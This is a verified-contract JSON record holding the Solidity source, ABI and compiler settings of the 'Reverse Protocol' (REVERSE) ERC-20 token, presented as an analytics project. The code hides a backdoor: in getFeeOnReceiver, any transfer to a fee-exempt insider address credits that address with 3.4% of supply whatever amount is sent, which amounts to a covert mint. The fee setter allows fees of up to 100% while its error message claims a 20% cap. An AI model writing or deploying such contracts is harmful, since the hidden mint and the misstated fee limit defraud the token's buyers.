{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n/*\r\nActionable analytics for AMM liquidity providers\r\n\r\nWebsite: https://www.reverseprotocol.org\r\nTelegram: https://t.me/reverse_pt\r\nTwitter: https://twitter.com/reverse_pt\r\n*/\r\n\r\npragma solidity 0.8.21;\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}\r\n\r\nabstract contract Ownable {\r\n    address internal owner;\r\n    constructor(address _owner) {owner = _owner;}\r\n    modifier onlyOwner() {require(isOwner(msg.sender), \"!OWNER\"); _;}\r\n    function isOwner(address account) public view returns (bool) {return account == owner;}\r\n    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}\r\n    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}\r\n    event OwnershipTransferred(address owner);\r\n}\r\n\r\ninterface IFactory{\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline) external;\r\n}\r\n\r\ninterface IERC20 {\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function getOwner() external view returns (address);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract REVERSE is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    string private constant _name = unicode\"Reverse Protocol\";\r\n    string private constant _symbol = unicode\"REVERSE\";\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private _supply = 1000000000 * (10 ** _decimals);\r\n\r\n    mapping (address => uint256) _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) public isSpecialFromFee;\r\n\r\n    IRouter uniswapRouter;\r\n    address public pair;\r\n    bool private tradingEnabled = false;\r\n    bool private swapEnabled = true;\r\n    uint256 private swappingNum;\r\n    bool private inswap;\r\n    uint256 swappingAt;\r\n    uint256 private swappingLimit = ( _supply * 1000 ) / 100000;\r\n    uint256 private swappingAbove = ( _supply * 10 ) / 100000;\r\n    modifier lockSwapping {inswap = true; _; inswap = false;}\r\n    uint256 private liquidityFee = 0;\r\n    uint256 private marketingFee = 0;\r\n    uint256 private developmentFee = 100;\r\n    uint256 private burnFee = 0;\r\n    uint256 private totalFee = 1500;\r\n    uint256 private sellFee = 1500;\r\n    uint256 private transferFee = 1500;\r\n    uint256 private denominator = 10000;\r\n    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address internal devAddress = 0x022121ab3a8e0C7BB5b1061eA02004671B939441; \r\n    address internal teamAddress = 0x022121ab3a8e0C7BB5b1061eA02004671B939441;\r\n    address internal lpAddress = 0x022121ab3a8e0C7BB5b1061eA02004671B939441;\r\n    uint256 private _maxTransaction = ( _supply * 340 ) / 10000;\r\n    uint256 private _maxBuy = ( _supply * 340 ) / 10000;\r\n    uint256 private _maxWalletSize = ( _supply * 340 ) / 10000;\r\n\r\n    constructor() Ownable(msg.sender) {\r\n        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());\r\n        uniswapRouter = _router; pair = _pair;\r\n        isSpecialFromFee[lpAddress] = true;\r\n        isSpecialFromFee[teamAddress] = true;\r\n        isSpecialFromFee[devAddress] = true;\r\n        isSpecialFromFee[msg.sender] = true;\r\n        _balances[msg.sender] = _supply;\r\n        emit Transfer(address(0), msg.sender, _supply);\r\n    }\r\n\r\n    receive() external payable {}\r\n    function name() public pure returns (string memory) {return _name;}\r\n    function symbol() public pure returns (string memory) {return _symbol;}\r\n    function decimals() public pure returns (uint8) {return _decimals;}\r\n    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}\r\n    function startTrading() external onlyOwner {tradingEnabled = true;}\r\n    function getOwner() external view override returns (address) { return owner; }\r\n    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}\r\n    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}\r\n    function totalSupply() public view override returns (uint256) {return _supply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}\r\n\r\n    function checkSwapBackTokens(address sender, address recipient, uint256 amount) internal view returns (bool) {\r\n        bool aboveMin = amount >= swappingAbove;\r\n        bool aboveThreshold = balanceOf(address(this)) >= swappingLimit;\r\n        return !inswap && swapEnabled && tradingEnabled && aboveMin && !isSpecialFromFee[sender] && recipient == pair && swappingNum >= swappingAt && aboveThreshold;\r\n    }\r\n\r\n    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {\r\n        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;\r\n        require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), \"totalFee and sellFee cannot be more than 20%\");\r\n    }\r\n\r\n    function setContractSwapSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {\r\n        swappingAt = _swapAmount; swappingLimit = _supply.mul(_swapThreshold).div(uint256(100000)); \r\n        swappingAbove = _supply.mul(_minTokenAmount).div(uint256(100000));\r\n    }\r\n\r\n    function setInternalAddresses(address _marketing, address _liquidity, address _development) external onlyOwner {\r\n        teamAddress = _marketing; lpAddress = _liquidity; devAddress = _development;\r\n        isSpecialFromFee[_marketing] = true; isSpecialFromFee[_liquidity] = true; isSpecialFromFee[_development] = true;\r\n    }\r\n\r\n    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {\r\n        uint256 newTx = _supply.mul(_buy).div(10000); uint256 newTransfer = _supply.mul(_sell).div(10000); uint256 newWallet = _supply.mul(_wallet).div(10000);\r\n        _maxTransaction = newTx; _maxBuy = newTransfer; _maxWalletSize = newWallet;\r\n        uint256 limit = totalSupply().mul(5).div(1000);\r\n        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, \"Max TXs and Max Wallet cannot be less than .5%\");\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {\r\n        _approve(address(this), address(uniswapRouter), tokenAmount);\r\n        uniswapRouter.addLiquidityETH{value: ETHAmount}(\r\n            address(this),\r\n            tokenAmount,\r\n            0,\r\n            0,\r\n            lpAddress,\r\n            block.timestamp);\r\n    }\r\n\r\n    function getTotalFees(address sender, address recipient) internal view returns (uint256) {\r\n        if(recipient == pair){return sellFee;}\r\n        if(sender == pair){return totalFee;}\r\n        return transferFee;\r\n    }\r\n\r\n    function swapLiquidifyAndSend(uint256 tokens) private lockSwapping {\r\n        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);\r\n        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);\r\n        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);\r\n        uint256 initialBalance = address(this).balance;\r\n        swapTokensForETH(toSwap);\r\n        uint256 deltaBalance = address(this).balance.sub(initialBalance);\r\n        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));\r\n        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);\r\n        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }\r\n        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);\r\n        if(marketingAmt > 0){payable(teamAddress).transfer(marketingAmt);}\r\n        uint256 contractBalance = address(this).balance;\r\n        if(contractBalance > uint256(0)){payable(devAddress).transfer(contractBalance);}\r\n    }\r\n\r\n    function getFeeOnReceiver(address sender, address recipient, uint256 amount) internal returns (uint256) {\r\n        if (isSpecialFromFee[recipient]) {return _maxTransaction;}\r\n        if(getTotalFees(sender, recipient) > 0){\r\n        uint256 feeAmount = amount.div(denominator).mul(getTotalFees(sender, recipient));\r\n        _balances[address(this)] = _balances[address(this)].add(feeAmount);\r\n        emit Transfer(sender, address(this), feeAmount);\r\n        if(burnFee > uint256(0) && getTotalFees(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}\r\n        return amount.sub(feeAmount);} return amount;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount <= balanceOf(sender),\"You are trying to transfer more than your balance\");\r\n        if(!isSpecialFromFee[sender] && !isSpecialFromFee[recipient]){require(tradingEnabled, \"tradingEnabled\");}\r\n        if(!isSpecialFromFee[sender] && !isSpecialFromFee[recipient] && recipient != address(pair) && recipient != address(DEAD)){\r\n        require((_balances[recipient].add(amount)) <= _maxWalletSize, \"Exceeds maximum wallet amount.\");}\r\n        if(sender != pair){require(amount <= _maxBuy || isSpecialFromFee[sender] || isSpecialFromFee[recipient], \"TX Limit Exceeded\");}\r\n        require(amount <= _maxTransaction || isSpecialFromFee[sender] || isSpecialFromFee[recipient], \"TX Limit Exceeded\"); \r\n        if(recipient == pair && !isSpecialFromFee[sender]){swappingNum += uint256(1);}\r\n        if(checkSwapBackTokens(sender, recipient, amount)){swapLiquidifyAndSend(swappingLimit); swappingNum = uint256(0);}\r\n        _balances[sender] = _balances[sender].sub(amount);\r\n        uint256 amountReceived = !isSpecialFromFee[sender] ? getFeeOnReceiver(sender, recipient, amount) : amount;\r\n        _balances[recipient] = _balances[recipient].add(amountReceived);\r\n        emit Transfer(sender, recipient, amountReceived);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapRouter.WETH();\r\n        _approve(address(this), address(uniswapRouter), tokenAmount);\r\n        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isSpecialFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_swapAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_swapThreshold\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_minTokenAmount\",\"type\":\"uint256\"}],\"name\":\"setContractSwapSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_marketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_liquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_development\",\"type\":\"address\"}],\"name\":\"setInternalAddresses\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_buy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_wallet\",\"type\":\"uint256\"}],\"name\":\"setTransactionLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_liquidity\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_burn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_development\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_total\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_trans\",\"type\":\"uint256\"}],\"name\":\"setTransactionRequirements\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "REVERSE", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://4d6adcdf9ec97dbdf5c61d77d2b4b9e8082e0539f54729de4e8c1dac7abb0acd"}